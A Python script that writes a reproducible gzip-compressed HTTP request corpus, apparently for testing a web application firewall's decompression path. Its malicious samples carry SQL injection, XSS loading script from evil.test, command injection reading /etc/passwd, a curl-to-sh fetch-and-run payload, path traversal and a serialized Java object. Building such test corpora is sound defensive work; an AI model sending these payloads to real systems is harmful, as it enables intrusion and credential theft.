#!/usr/bin/env python3
"""Generate the local gzip request corpus.

The upstream blazehttp corpus carries 231 gzip requests and all of them are
benign, so the decompression path has no end-to-end attack coverage. This
script writes a small, reproducible set of malicious and benign compressed
requests into `local/gzip/`; `suites.json` exposes them as the `compressed`
suite.

Deterministic by construction: `mtime=0` in every gzip header, fixed payload
ordering, sorted output. Running it twice produces identical bytes.
"""

import gzip
import pathlib

HERE = pathlib.Path(__file__).resolve().parent
OUT = HERE / "local" / "gzip"

MALICIOUS = [
    ("sqli-union.black", "id=1+union+select+username,password+from+users--", "form"),
    ("sqli-blind.black", "id=1+and+1%3D2+and+sleep(5)", "form"),
    ("xss-script.black", "comment=%3Cscript+src%3Dhttps://evil.test/x.js%3E%3C/script%3E", "form"),
    ("xss-onerror.black", "q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E", "form"),
    ("rce-cat.black", "host=127.0.0.1;cat+/etc/passwd", "form"),
    ("rce-cmdsub.black", "host=%24(curl+http://evil.test/x.sh%7Csh)", "form"),
    ("lfi-passwd.black", "file=../../../../etc/passwd", "form"),
    (
        "deser-java.black",
        "data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABAwAAeHB3CAAAAAB4",
        "form",
    ),
]

BENIGN = [
    (
        "json-api.white",
        '{"action":"list","page":2,"size":20,"filter":{"status":"active"}}',
        "json",
    ),
    (
        "html-form.white",
        "title=Release+notes&body=Fixed+three+issues+in+the+parser+and+%0A"
        "improved+the+documentation+for+the+query+builder.",
        "form",
    ),
]

CONTENT_TYPES = {
    "form": "application/x-www-form-urlencoded",
    "json": "application/json",
}


def compressed(body: bytes) -> bytes:
    return gzip.compress(body, compresslevel=9, mtime=0)


def request(name: str, body: str, kind: str) -> bytes:
    payload = compressed(body.encode())
    head = (
        f"POST /api/{name.rsplit('.', 1)[0]} HTTP/1.1\r\n"
        "Host: local.test\r\n"
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\r\n"
        f"Content-Type: {CONTENT_TYPES[kind]}\r\n"
        "Content-Encoding: gzip\r\n"
        f"Content-Length: {len(payload)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    return head + payload


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    for old in sorted(OUT.glob("*")):
        if old.suffix in (".black", ".white"):
            old.unlink()
    for name, body, kind in MALICIOUS + BENIGN:
        (OUT / name).write_bytes(request(name, body, kind))
    print(
        f"wrote {len(MALICIOUS)} malicious and {len(BENIGN)} benign gzip "
        f"samples to {OUT}"
    )


if __name__ == "__main__":
    main()
